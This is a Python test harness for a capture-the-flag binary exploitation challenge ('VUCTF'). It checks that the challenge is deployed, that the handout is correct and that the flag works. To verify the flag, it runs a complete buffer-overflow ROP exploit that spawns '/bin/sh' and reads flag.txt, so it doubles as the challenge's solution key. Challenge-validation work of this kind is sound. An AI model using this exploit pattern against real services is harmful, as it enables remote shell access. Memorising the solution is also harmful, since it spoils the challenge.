from pwn import *
import argparse
import filecmp
import json
import re
import os
import socket

context.log_level = 'error'

def run_test(flag, connection_string=None, handout_path=None, deployment_path=None, force_reusability=False):
    result = {}
    connection_string = connection_string[0] # We only have a single connection string
    host = connection_string.split(" ")[0]
    port = connection_string.split(" ")[1]

    # If the challenge is in good working order (DEPLOYMENT_WORKING)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    res = sock.connect_ex((host, int(port)))
    
    if (res == 0):
        sock.close()
        p = remote(host, int(port))
        if "Tell me my secret shutdown command" in p.recvline().decode('ascii'):
            result["DEPLOYMENT_WORKING"] = ""
        else:
            result["DEPLOYMENT_WORKING"] = "Challenge banner missing"
        p.close()    
    else:
        result["DEPLOYMENT_WORKING"] = "Connection failed"

    # If the deployed flag and the stored flag (pass as function parameter) match (FLAG_CORRECT)
    if result["DEPLOYMENT_WORKING"]:
        result["FLAG_CORRECT"] = "Unable to check flag"
    else:
        
        io = remote(host, int(port))

        io.recvuntil(b'secret shutdown command')

        OFFSET = 24
        XOR_RAX_RAX = 0x0000000000401184
        XOR_EAX_EAX = 0x0000000000401185
        XOR_EDI_EDI = 0x000000000040118f
        POP_RDX = 0x0000000000401182  
        POP_R15 = 0x0000000000401196
        BSS_ADDR = 0x404200
        MOV_RSI_R15 = 0x0000000000401192

        POP_RDI = 0x0000000000401197

        MOV_EAX_3B = 0x0000000000401188

        XOR_R15_R15 = 0x000000000040118e

        SYSCALL = 0x0000000000401199
        RET = 0x000000000040101a

        payload = b'A' * OFFSET

        #? 1 - Write /bin/sh\x00 to BSS
        payload += p64(RET)
        payload += p64(XOR_RAX_RAX)
        payload += p64(XOR_EDI_EDI)
        payload += p64(POP_RDX)
        payload += p64(8) # Read 8 bytes

        payload += p64(POP_R15)
        payload += p64(BSS_ADDR)
        payload += p64(MOV_RSI_R15)
        payload += p64(SYSCALL)

        #? 2- pop rdi and store the address of the BSS /bin/sh\x00
        payload += p64(RET)
        payload += p64(POP_RDI)
        payload += p64(BSS_ADDR)

        #? 3 - Set rax to 0x3b (execve syscall)
        payload += p64(XOR_EAX_EAX)
        payload += p64(MOV_EAX_3B)

        #? 4 - zero out rsi
        payload += p64(XOR_R15_R15)
        payload += p64(MOV_RSI_R15)

        #? 5 - Set rdx to 0
        payload += p64(POP_RDX)
        payload += p64(0)

        #? 6 - Syscall
        payload += p64(SYSCALL)

        io.sendline(payload)
        time.sleep(3)
        io.sendline(b'/bin/sh\x00')
        time.sleep(1)
        io.sendline(b'cat flag.txt')

        output = io.recvall(timeout=2)
        io.close()

        matches = re.findall( r"VUCTF\{.*?\}", output.decode("ascii"))
        if flag.encode() in output:
            result["FLAG_CORRECT"] = ""
        else:
            result["FLAG_CORRECT"] = "Flag not found in output"

    # All required handout files are present, and match the deployment (HANDOUT_CORRECT)
    if not {"roomba.dump"}.issubset(set(os.listdir(handout_path))):
        result["HANDOUT_CORRECT"] = "Missing roomba.dump in handout"
    else:
        _, missmatch, _ = filecmp.cmpfiles(handout_path, deployment_path,
                                           ["roomba.dump"], shallow=False)
        result["HANDOUT_CORRECT"] = ''.join(missmatch)

    return result


def grep_recursive(pattern, path):
    """
    Recursively search for a pattern in all files within a given directory.

    :param pattern: The regex pattern to search for.
    :param path: The directory path to search in.
    """
    result = ""
    compiled_pattern = re.compile(pattern)

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line_number, line in enumerate(f, start=1):
                        if compiled_pattern.search(line):
                            result += f"{file_path}:{line_number}:{line.strip()}\n"
            except Exception as e:
                print(f"Error reading {file_path}: {e}")

    return result

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Run the test with specified arguments.")

    parser.add_argument("--flag", type=str, required=True, help="The flag to run the test.")
    parser.add_argument("--connection-string", type=str, required=True, action='append',
                        help="The connection string in the form: \"<ip/hostname> <port>\"" +
                        "an example includes: --connection-string \"localhost 1337\" or" +
                        "--connection-string \"172.18.0.1 6564\"")
    parser.add_argument("--handout-path", type=str, required=True, help="The path" +
    " the /Handout dir of the challenge.")
    parser.add_argument("--deployment-path", type=str, required=True, help="The " +
    "path to the /Source directory of this challenge.")

    parser.add_argument("--force-reusability", action="store_true", help="This " +
    "flag is used when testing the challenge before it is given to the player."
    "After test is run with this flag, no artifacts should be left around"
    "that can affect the players experience")
    args = parser.parse_args()

    print(json.dumps(
        run_test(
            flag=args.flag,
            connection_string=args.connection_string,
            handout_path=args.handout_path,
            deployment_path=args.deployment_path,
            force_reusability=args.force_reusability
        )
    ))
